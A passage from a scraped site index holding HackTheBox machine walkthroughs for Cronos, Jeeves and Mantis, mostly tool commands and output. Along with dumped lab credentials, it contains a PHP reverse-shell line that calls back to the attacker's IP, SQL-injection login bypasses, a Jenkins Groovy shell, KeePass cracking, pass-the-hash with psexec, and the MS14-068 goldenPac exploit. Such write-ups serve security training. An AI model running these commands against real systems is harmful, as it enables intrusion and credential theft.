53/tcp open domain ISC BIND 9.10.3-P4 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.10.3-P4-Ubuntu 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.18 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Web server dns └─$ nslookup -q=ptr 10.10.10.13 10.10.10.13 Server: 10.10.10.13 Address: 10.10.10.13#53 13.10.10.10.in-addr.arpa name = ns1.cronos.htb. └─$ dig axfr @10.10.10.13 cronos.htb ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.16-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr @10.10.10.13 cronos.htb ; (1 server found) ;; global options: +cmd cronos.htb. 604800 IN SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800 cronos.htb. 604800 IN NS ns1.cronos.htb. cronos.htb. 604800 IN A 10.10.10.13 admin.cronos.htb. 604800 IN A 10.10.10.13 ns1.cronos.htb. 604800 IN A 10.10.10.13 www.cronos.htb. 604800 IN A 10.10.10.13 cronos.htb. 604800 IN SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800 ;; Query time: 220 msec ;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP) ;; WHEN: Fri Sep 01 15:14:05 BST 2023 ;; XFR size: 7 records (messages 1, bytes 203) vhosts └─$ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u \u0026#39;http://cronos.htb/\u0026#39; -H \u0026#39;Host: FUZZ.cronos.htb\u0026#39; -fs 11439 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://cronos.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt :: Header : Host: FUZZ.cronos.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 11439 ________________________________________________ [Status: 200, Size: 2319, Words: 990, Lines: 86, Duration: 309ms] * FUZZ: www [Status: 200, Size: 1547, Words: 525, Lines: 57, Duration: 5057ms] * FUZZ: admin Foothold/User www.cronos.htb admin.cronos.htb Default admin:admin creds don\u0026rsquo;t work Tried basic sqli payloads admin' or 1-- - didn\u0026rsquo;t work ' or 1-- 1 works Okay, right away we see possible command injection Sending modified request from burp with command injection works Now we need to get reverse shell Root Tried password from config.php in web root, but didn\u0026rsquo;t work www-data@cronos:/var/www/admin$ grep -inrl \u0026#34;passw\u0026#34; . ./config.php ./index.php www-data@cronos:/var/www/admin$ cat config.php \u0026lt;?php define(\u0026#39;DB_SERVER\u0026#39;, \u0026#39;localhost\u0026#39;); define(\u0026#39;DB_USERNAME\u0026#39;, \u0026#39;admin\u0026#39;); define(\u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;kEjdbRigfBHUREiNSDs\u0026#39;); define(\u0026#39;DB_DATABASE\u0026#39;, \u0026#39;admin\u0026#39;); $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE); ?\u0026gt; www-data@cronos:/var/www/admin$ su - Password: su: Authentication failure www-data@cronos:/var/www/admin$ The name of the box is cronos maybe, it\u0026rsquo;s related to cronjobs So we might need to check there Looks like the job is running every minute as root Let\u0026rsquo;s modify artisan I used https://www.revshells.com/ $sock=fsockopen(\u0026quot;10.10.16.4\u0026quot;,6666);exec(\u0026quot;/bin/bash \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026quot;); And we receive connection back ","date":"September 1, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/cronos/images/cronos.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/cronos/","summary":"Cronos Enumeration nmap └─$ nmap -Pn -p- 10.10.10.13 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 14:23 BST Stats: 0:00:02 elapsed; 0 hosts completed (0 up), 0 undergoing Host Discovery Parallel DNS resolution of 1 host. Timing: About 0.00% done Warning: 10.10.10.13 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.10.13 (10.10.10.13) Host is up (0.15s latency). Not shown: 65520 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 80/tcp open http └─$ nmap -Pn -p22,53,80 -sC -sV 10.","tags":["HTB","dns","nslookup","zone-transfer","dig","vhosts","laravel","sqli","command-injection","linpeas","cron","php","mysql"],"title":"[HTB] Machine: Cronos"},{"categories":null,"contents":"Jeeves Enumeration nmap └─$ nmap -Pn -p- 10.10.10.63 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 07:05 BST Nmap scan report for 10.10.10.63 (10.10.10.63) Host is up (0.092s latency). Not shown: 65531 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 445/tcp open microsoft-ds 50000/tcp open ibm-db2 └─$ nmap -Pn -p80,135,445,50000 -sC -sV 10.10.10.63 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 07:13 BST Nmap scan report for 10.10.10.63 (10.10.10.63) Host is up (0.12s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Ask Jeeves |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 50000/tcp open http Jetty 9.4.z-SNAPSHOT |_http-server-header: Jetty(9.4.z-SNAPSHOT) |_http-title: Error 404 Not Found Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required | smb2-time: | date: 2023-09-01T11:12:45 |_ start_date: 2023-09-01T09:45:58 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: 4h59m24s, deviation: 0s, median: 4h59m24s Web Server gobuster └─$ gobuster dir -u http://10.10.10.63/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.63/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt [+] Timeout: 10s =============================================================== 2023/09/01 07:31:16 Starting gobuster in directory enumeration mode =============================================================== Progress: 441122 / 441122 (100.00%) smb └─$ smbclient -N -L //10.10.10.63 session setup failed: NT_STATUS_ACCESS_DENIED Port 50000 └─$ gobuster dir -u http://10.10.10.63:50000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.63:50000/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt [+] Timeout: 10s =============================================================== 2023/09/01 07:38:22 Starting gobuster in directory enumeration mode =============================================================== /askjeeves (Status: 302) [Size: 0] [--\u0026gt; http://10.10.10.63:50000/askjeeves/] Foothold / User http://10.10.10.63:50000/askjeeves/ We can perform one of the techniques specified in this post I used \u0026lsquo;groovy script` way println \u0026quot;\u0026lt;powershell bas64-encrypted-payload\u0026gt;\u0026quot;.execute() Payload from https://www.revshells.com/ Root kohsuke user PS C:\\Users\\kohsuke\u0026gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station Disabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeTimeZonePrivilege Change the time zone Disabled PS C:\\Users\\kohsuke\u0026gt; whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ==================================== ================ ============ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\SERVICE Well-known group S-1-5-6 Mandatory group, Enabled by default, Enabled group CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\High Mandatory Level Label S-1-16-12288 We have kdbx file in Documents directory PS C:\\Users\\kohsuke\u0026gt; ls documents Directory: C:\\Users\\kohsuke\\documents Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 9/18/2017 1:43 PM 2846 CEH.kdbx Let\u0026rsquo;s download it We can create Freestyle Project in Jenkins and copy files to that project PS C:\\Users\\Administrator\\.jenkins\u0026gt; ls Directory: C:\\Users\\Administrator\\.jenkins Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 9/1/2023 8:47 AM jobs d----- 11/3/2017 10:33 PM logs d----- 11/3/2017 10:33 PM nodes d----- 11/3/2017 10:44 PM plugins d----- 9/1/2023 8:48 AM secrets d----- 11/8/2017 8:52 AM updates d----- 11/3/2017 10:33 PM userContent d----- 11/3/2017 10:33 PM users d----- 11/3/2017 10:47 PM war d----- 11/3/2017 10:43 PM workflow-libs d----- 9/1/2023 8:48 AM workspace -a---- 9/1/2023 8:17 AM 48 .owner -a---- 9/1/2023 5:46 AM 1684 config.xml -a---- 9/1/2023 5:46 AM 156 hudson.model.UpdateCenter.xml -a---- 11/3/2017 10:43 PM 374 hudson.plugins.git.GitTool.xml -a---- 11/3/2017 10:33 PM 1712 identity.key.enc -a---- 11/3/2017 10:46 PM 94 jenkins.CLI.xml 9/1/2023 7:42 AM 80690 jenkins.err.log -a---- 11/3/2017 10:47 PM 360448 jenkins.exe -a---- 11/3/2017 10:47 PM 331 jenkins.exe.config -a---- 9/1/2023 5:46 AM 4 jenkins.install.InstallUtil.lastExecVersion -a---- 11/3/2017 10:45 PM 4 jenkins.install.UpgradeWizard.state -a---- 11/3/2017 10:46 PM 138 jenkins.model.DownloadSettings.xml 10/25/2022 12:41 PM 2856 jenkins.out.log -a---- 9/1/2023 5:46 AM 4 jenkins.pid -a---- 11/3/2017 10:46 PM 169 jenkins.security.QueueItemAuthenticatorConfiguration.xml -a---- 11/3/2017 10:46 PM 162 jenkins.security.UpdateSiteWarningsConfiguration.xml -a---- 11/3/2017 10:47 PM 74271222 jenkins.war -a---- 9/1/2023 5:46 AM 36360 jenkins.wrapper.log -a---- 11/3/2017 10:49 PM 2881 jenkins.xml -a---- 9/1/2023 5:46 AM 907 nodeMonitors.xml -a---- 11/3/2017 10:47 PM 129 queue.xml.bak -a---- 11/3/2017 10:33 PM 64 secret.key -a---- 11/3/2017 10:33 PM 0 secret.key.not-so-secret PS C:\\Users\\Administrator\\.jenkins\u0026gt; cd workspace PS C:\\Users\\Administrator\\.jenkins\\workspace\u0026gt; ls Directory: C:\\Users\\Administrator\\.jenkins\\workspace Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 9/1/2023 8:48 AM pentest PS C:\\Users\\Administrator\\.jenkins\\workspace\u0026gt; cd pentest PS C:\\Users\\Administrator\\.jenkins\\workspace\\pentest\u0026gt; ls PS C:\\Users\\Administrator\\.jenkins\\workspace\\pentest\u0026gt; copy C:\\Users\\kohsuke\\documents\\CEH.kdbx . PS C:\\Users\\Administrator\\.jenkins\\workspace\\pentest\u0026gt; ls Directory: C:\\Users\\Administrator\\.jenkins\\workspace\\pentest Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 9/18/2017 1:43 PM 2846 CEH.kdbx Now we can download it from jenkins Let\u0026rsquo;s crack it using john First we convert it using keepass2john Then pass it to john Or hashcat if you want └─$ keepass2john CEH.kdbx \u0026gt; CEH.hash └─$ john --wordlist=/usr/share/wordlists/rockyou.txt CEH.hash Using default input encoding: UTF-8 Loaded 1 password hash (KeePass [SHA256 AES 32/64]) Cost 1 (iteration count) is 6000 for all loaded hashes Cost 2 (version) is 2 for all loaded hashes Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status moonshine1 (CEH) 1g 0:00:00:38 DONE (2023-09-01 09:23) 0.02623g/s 1442p/s 1442c/s 1442C/s mwuah..moonshine1 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Let\u0026rsquo;s open it in keepass (or kpcli) We have bunch of passwords Let\u0026rsquo;s extract them and pass them to crackmapexec But none of them work └─$ cat passwords 12345 S1TjAtJHKsugh9oC4VZl pwndyouall! F7WhTrSFDKB6sxHU1cUn lCEUnYPjNfIuPZSzOySA Password └─$ crackmapexec smb 10.10.10.63 -u Administrator -p passwords SMB 10.10.10.63 445 JEEVES [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True) SMB 10.10.10.63 445 JEEVES [-] Jeeves\\Administrator:12345 STATUS_LOGON_FAILURE SMB 10.10.10.63 445 JEEVES [-] Jeeves\\Administrator:S1TjAtJHKsugh9oC4VZl STATUS_LOGON_FAILURE SMB 10.10.10.63 445 JEEVES [-] Jeeves\\Administrator:pwndyouall! STATUS_LOGON_FAILURE SMB 10.10.10.63 445 JEEVES [-] Jeeves\\Administrator:F7WhTrSFDKB6sxHU1cUn STATUS_LOGON_FAILURE SMB 10.10.10.63 445 JEEVES [-] Jeeves\\Administrator:lCEUnYPjNfIuPZSzOySA STATUS_LOGON_FAILURE SMB 10.10.10.63 445 JEEVES [-] Jeeves\\Administrator:Password STATUS_LOGON_FAILURE The Backup Stuff entry in keepass looks like a lm:ntlm hash aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 Let\u0026rsquo;s try crackmapexec with it └─$ crackmapexec smb 10.10.10.63 -u Administrator -H \u0026#39;aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00\u0026#39; SMB 10.10.10.63 445 JEEVES [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True) SMB 10.10.10.63 445 JEEVES [+] Jeeves\\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!) Get Administrator shell using psexec └─$ impacket-psexec Administrator@10.10.10.63 -hashes \u0026#39;aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00\u0026#39; Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Requesting shares on 10.10.10.63..... [*] Found writable share ADMIN$ [*] Uploading file nEgujjRd.exe [*] Opening SVCManager on 10.10.10.63..... [*] Creating service tTjL on 10.10.10.63..... [*] Starting service tTjL..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.10586] (c) 2015 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt; No root flag c:\\Users\\Administrator\\Desktop\u0026gt; dir Volume in drive C has no label. Volume Serial Number is 71A1-6FA1 Directory of c:\\Users\\Administrator\\Desktop 11/08/2017 10:05 AM \u0026lt;DIR\u0026gt; . 11/08/2017 10:05 AM \u0026lt;DIR\u0026gt; .. 12/24/2017 03:51 AM 36 hm.txt 11/08/2017 10:05 AM 797 Windows 10 Update Assistant.lnk 2 File(s) 833 bytes 2 Dir(s) 2,655,694,848 bytes free If we check alternative data stream with dir /R, we see it c:\\Users\\Administrator\\Desktop\u0026gt; dir /R Volume in drive C has no label. Volume Serial Number is 71A1-6FA1 Directory of c:\\Users\\Administrator\\Desktop 11/08/2017 10:05 AM \u0026lt;DIR\u0026gt; . 11/08/2017 10:05 AM \u0026lt;DIR\u0026gt; .. 12/24/2017 03:51 AM 36 hm.txt 34 hm.txt:root.txt:$DATA 11/08/2017 10:05 AM 797 Windows 10 Update Assistant.lnk 2 File(s) 833 bytes 2 Dir(s) 2,655,694,848 bytes free c:\\Users\\Administrator\\Desktop\u0026gt; We can read it with more \u0026lt; hm.txt:root.txt ","date":"September 1, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/jeeves/images/jeeves.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/jeeves/","summary":"Jeeves Enumeration nmap └─$ nmap -Pn -p- 10.10.10.63 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 07:05 BST Nmap scan report for 10.10.10.63 (10.10.10.63) Host is up (0.092s latency). Not shown: 65531 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 445/tcp open microsoft-ds 50000/tcp open ibm-db2 └─$ nmap -Pn -p80,135,445,50000 -sC -sV 10.10.10.63 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 07:13 BST Nmap scan report for 10.","tags":["HTB","jetty","jenkins","keepass","kpcli","hastcat","passthehash","crackstation","psexec","alternative-data-streams"],"title":"[HTB] Machine: Jeeves"},{"categories":null,"contents":"Mantis Enumeration nmap └─$ nmap -Pn -p- 10.10.10.52 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-03 09:57 BST Nmap scan report for 10.10.10.52 (10.10.10.52) Host is up (0.12s latency). Not shown: 65508 closed tcp ports (conn-refused) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1337/tcp open waste 1433/tcp open ms-sql-s 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5722/tcp open msdfsr 8080/tcp open http-proxy 9389/tcp open adws 47001/tcp open winrm 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown 49161/tcp open unknown 49165/tcp open unknown 49171/tcp open unknown 50255/tcp open unknown └─$ nmap -Pn -p53,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,10475,26347,49152,49153,49154,49155,49157,49158,49164,49165,49171,50255 -sC -sV 10.10.10.52 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-03 10:22 BST Nmap scan report for 10.10.10.52 (10.10.10.52) Host is up (0.15s latency). PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15CD4) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-03 09:22:30Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 1337/tcp open http Microsoft IIS httpd 7.5 |_http-server-header: Microsoft-IIS/7.5 |_http-title: IIS7 | http-methods: |_ Potentially risky methods: TRACE 1433/tcp open ms-sql-s Microsoft SQL Server 2014 12.00.2000.00; RTM | ms-sql-info: | 10.10.10.52:1433: | Version: | name: Microsoft SQL Server 2014 RTM | number: 12.00.2000.00 | Product: Microsoft SQL Server 2014 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 | ms-sql-ntlm-info: | 10.10.10.52:1433: | Target_Name: HTB | NetBIOS_Domain_Name: HTB | NetBIOS_Computer_Name: MANTIS | DNS_Domain_Name: htb.local | DNS_Computer_Name: mantis.htb.local | DNS_Tree_Name: htb.local |_ Product_Version: 6.1.7601 |_ssl-date: 2023-09-03T09:23:37+00:00; -36s from scanner time. | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2023-09-03T08:54:18 |_Not valid after: 2053-09-03T08:54:18 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5722/tcp open msrpc Microsoft Windows RPC 8080/tcp open http Microsoft IIS httpd 7.5 |_http-server-header: Microsoft-IIS/7.5 |_http-title: Tossed Salad - Blog 9389/tcp open mc-nmf .NET Message Framing 10475/tcp closed unknown 26347/tcp closed unknown 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC 49164/tcp closed unknown 49165/tcp open msrpc Microsoft Windows RPC 49171/tcp open msrpc Microsoft Windows RPC 50255/tcp open ms-sql-s Microsoft SQL Server 2014 12.00.2000.00; RTM | ms-sql-info: | 10.10.10.52:50255: | Version: | name: Microsoft SQL Server 2014 RTM | number: 12.00.2000.00 | Product: Microsoft SQL Server 2014 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 50255 | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2023-09-03T08:54:18 |_Not valid after: 2053-09-03T08:54:18 | ms-sql-ntlm-info: | 10.10.10.52:50255: | Target_Name: HTB | NetBIOS_Domain_Name: HTB | NetBIOS_Computer_Name: MANTIS | DNS_Domain_Name: htb.local | DNS_Computer_Name: mantis.htb.local | DNS_Tree_Name: htb.local |_ Product_Version: 6.1.7601 |_ssl-date: 2023-09-03T09:23:37+00:00; -37s from scanner time. Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2:1:0: |_ Message signing enabled and required | smb2-time: | date: 2023-09-03T09:23:28 |_ start_date: 2023-09-03T08:54:08 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb-os-discovery: | OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1) | OS CPE: cpe:/o:microsoft:windows_server_2008::sp1 | Computer name: mantis | NetBIOS computer name: MANTIS\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: mantis.htb.local |_ System time: 2023-09-03T05:23:27-04:00 |_clock-skew: mean: 33m41s, deviation: 1h30m43s, median: -36s smb └─$ smbclient -N -L //10.10.10.52 Anonymous login successful Sharename Type Comment --------- ---- ------- Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.10.52 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available rpc └─$ rpcclient -U \u0026#39;\u0026#39; -N 10.10.10.52 rpcclient $\u0026gt; enumdomusers result was NT_STATUS_ACCESS_DENIED rpcclient $\u0026gt; querydispinfo result was NT_STATUS_ACCESS_DENIED rpcclient $\u0026gt; Port 8080 Looks like Orchard CMS Port 1337 gobuster └─$ gobuster dir -u http://10.10.10.52:1337/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.52:1337/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt [+] Timeout: 10s =============================================================== 2023/09/03 15:09:22 Starting gobuster in directory enumeration mode =============================================================== /orchard (Status: 500) [Size: 3026] /secure_notes (Status: 301) [Size: 160] [--\u0026gt; http://10.10.10.52:1337/secure_notes/] Apparently we could also enumerate users using kerbrute kerbrute userenum --domain htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.52 Foothold/User http://10.10.10.52:1337/secure_notes/ web.config results in 404 dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt has some notes The creds for admin are in binary format admin:010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001 It translates to @dm!n_P@ssW0rd! I missed it the first time I saw, but the the dev_notes files has a base64 part If we decode it, we have hex Then when convert it from hex and we have another password m$$ql_S@_P@ssW0rd! Tried login to mssql as sa but failed Then tried as admin it worked ┌──(kali㉿kali)-[~] └─$ impacket-mssqlclient sa:\u0026#39;m$$ql_S@_P@ssW0rd!\u0026#39;@10.10.10.52 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [-] ERROR(MANTIS\\SQLEXPRESS): Line 1: Login failed for user \u0026#39;sa\u0026#39;. ┌──(kali㉿kali)-[~] └─$ impacket-mssqlclient admin:\u0026#39;m$$ql_S@_P@ssW0rd!\u0026#39;@10.10.10.52 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 32576 [*] INFO(MANTIS\\SQLEXPRESS): Line 1: Changed database context to \u0026#39;master\u0026#39;. [*] INFO(MANTIS\\SQLEXPRESS): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (120 7208) [!] Press help for extra shell commands SQL\u0026gt; Now let\u0026rsquo;s enumerate the database SELECT name FROM master.dbo.sysdatabases; use orcharddb; SELECT * FROM orcharddb.INFORMATION_SCHEMA.TABLES; SELECT * FROM blog_Orchard_Users_UserPartRecord; We have james:J@m3s_P@ssW0rd! The creds are valid └─$ crackmapexec smb 10.10.10.52 -u james -p \u0026#39;J@m3s_P@ssW0rd!\u0026#39; SMB 10.10.10.52 445 MANTIS [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True) SMB 10.10.10.52 445 MANTIS [+] htb.local\\james:J@m3s_P@ssW0rd! Let\u0026rsquo;s enumerate users Seens like only james and Administrator exist └─$ rpcclient -U htb.local/james 10.10.10.52 Password for [HTB.LOCAL\\james]: rpcclient $\u0026gt; enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[james] rid:[0x44f] No AS-REP users └─$ impacket-GetNPUsers \u0026#39;htb.local/james:J@m3s_P@ssW0rd!\u0026#39; -dc-ip 10.10.10.52 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation No entries found! Nothing on smb └─$ smbclient -L //10.10.10.52 -U james --password \u0026#39;J@m3s_P@ssW0rd!\u0026#39; Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share SYSVOL Disk Logon server share Root So apparently, since this is an old box the intended path was MS14-068 https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/ms14-068 https://www.exploit-db.com/exploits/35474 For manual exploitation we can follow: https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html We can exploit it using mpacket-goldenPac └─$ impacket-goldenPac \u0026#39;htb.local/james:J@m3s_P@ssW0rd!\u0026#39;@mantis.htb.local -dc-ip 10.10.10.52 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103 [-] Couldn\u0026#39;t get forest info ([Errno Connection error (htb.local:445)] [Errno -2] Name or service not known), continuing [*] Attacking domain controller 10.10.10.52 [*] 10.10.10.52 found vulnerable! [*] Requesting shares on mantis.htb.local..... [*] Found writable share ADMIN$ [*] Uploading file YHXtNJXn.exe [*] Opening SVCManager on mantis.htb.local..... [*] Creating service hlvg on mantis.htb.local..... [*] Starting service hlvg..... [!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt; ","date":"September 1, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/mantis/images/mantis.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/mantis/","summary":"Mantis Enumeration nmap └─$ nmap -Pn -p- 10.10.10.52 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-03 09:57 BST Nmap scan report for 10.10.10.52 